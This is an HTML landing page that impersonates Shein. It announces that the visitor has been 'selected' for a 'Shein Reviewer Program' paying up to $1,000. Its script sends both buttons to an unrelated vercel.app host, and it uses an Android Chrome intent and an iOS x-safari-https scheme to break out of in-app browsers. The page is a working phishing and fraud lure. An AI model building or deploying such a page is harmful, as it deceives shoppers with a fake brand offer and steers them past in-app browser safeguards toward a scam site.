<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Shein Reviewer Program</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      min-height: 100vh;
      min-height: 100dvh;
      background: #fff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: space-between;
      padding: 60px 32px 48px;
      color: #111;
    }

    .top {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 28px;
      flex: 1;
      justify-content: center;
    }

    .icon {
      width: 88px;
      height: 88px;
      background: #111;
      border-radius: 22px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .icon svg {
      width: 52px;
      height: 52px;
      fill: #fff;
    }

    h1 {
      font-size: 26px;
      font-weight: 800;
      line-height: 1.25;
      text-align: center;
      letter-spacing: -0.02em;
    }

    h1 span {
      color: #e9619a;
    }

    .sub {
      font-size: 14px;
      color: #666;
      text-align: center;
      line-height: 1.5;
    }

    .buttons {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .btn-continue {
      width: 100%;
      padding: 18px;
      background: #f5b8cc;
      border: none;
      border-radius: 14px;
      font-size: 16px;
      font-weight: 700;
      color: #111;
      cursor: pointer;
      letter-spacing: 0.01em;
    }

    .btn-learn {
      width: 100%;
      padding: 18px;
      background: #f2f2f2;
      border: none;
      border-radius: 14px;
      font-size: 16px;
      font-weight: 600;
      color: #111;
      cursor: pointer;
    }

    .btn-continue:active { opacity: 0.85; }
    .btn-learn:active { opacity: 0.75; }
  </style>
</head>
<body>

  <div class="top">
    <div class="icon">
      <!-- Shein S logo -->
      <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
        <text x="50%" y="54%" dominant-baseline="middle" text-anchor="middle"
          font-family="-apple-system, BlinkMacSystemFont, sans-serif"
          font-size="48" font-weight="800" fill="#fff">S</text>
      </svg>
    </div>

    <h1>Congratulations! You<br>have been selected<br>for the <span>Shein Reviewer<br>Program</span></h1>

    <p class="sub">Rate a few Shein products and earn up to $1,000.</p>
  </div>

  <div class="buttons">
    <button class="btn-continue" id="continueBtn">Continue</button>
    <button class="btn-learn" id="learnBtn">Learn More</button>
  </div>

<script>
(function () {
  var DEST = 'https://shie.vercel.app/';

  function breakout() {
    var ua = navigator.userAgent;
    if (/Android/i.test(ua)) {
      var u = new URL(DEST);
      location.href = 'intent://' + u.host + u.pathname + u.search + u.hash
        + '#Intent;scheme=https;package=com.android.chrome;'
        + 'S.browser_fallback_url=' + encodeURIComponent(DEST) + ';end';
    } else if (/iPhone|iPad|iPod/i.test(ua)) {
      location.href = DEST.replace(/^https:/, 'x-safari-https:');
      setTimeout(function () { location.href = DEST; }, 900);
    } else {
      location.href = DEST;
    }
  }

  document.getElementById('continueBtn').addEventListener('click', breakout);
  document.getElementById('learnBtn').addEventListener('click', breakout);
})();
</script>

</body>
</html>
